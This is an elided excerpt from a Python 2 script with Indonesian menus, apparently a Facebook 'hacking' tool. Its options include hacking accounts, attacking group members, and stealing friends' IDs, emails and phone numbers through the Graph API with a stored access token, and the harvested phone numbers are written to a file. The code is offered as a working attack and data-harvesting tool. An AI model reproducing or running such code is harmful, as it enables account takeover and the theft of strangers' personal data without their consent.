...
def menu():
    ...
    print '\x1b[1;37;40m2. Hacking Akun Facebook'
            ...
            if zedd == '2':
                ...
                if zedd == '3':
                    ...
                    if zedd == '4':
                        ...
                        if zedd == '5':
                            os.system('rm -rf login.txt')
                            os.system('xdg-open https://github.com/Hackertrap/ ')
                            keluar()
                        else:
                            if zedd == '0':
                                keluar()
...
def super():
    ...
    print '\x1b[1;37;40m2. Hack dari member Grup'
    print '\x1b[1;31;40m0. Kembali'
    print
    pilih_super()
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMencuri id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
...
def grab():
    ...
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Curi ID pacar'
    print '\x1b[1;37;40m2. Curi ID pacar dari pacar'
    print '\x1b[1;37;40m3. Curi ID member GRUP'
    print '\x1b[1;37;40m4. Curi Email pacar'
    print '\x1b[1;37;40m5. Curi Email pacar dari pacar'
    print '\x1b[1;37;40m6. Curi No HP pacar'
    print '\x1b[1;37;40m7. Curi No HP pacar dari teman'
    print '\x1b[1;31;40m0. Kembali'
    print
    grab_pilih()
    ...
    try:
        ...
        try:
            ...
            for i in a['data']:
                ...
                z = json.loads(x.text)
                try:
                    hpfrompacarappend(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mNomor\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 40 * '\x1b[1;97m\xe2\x95\x90'
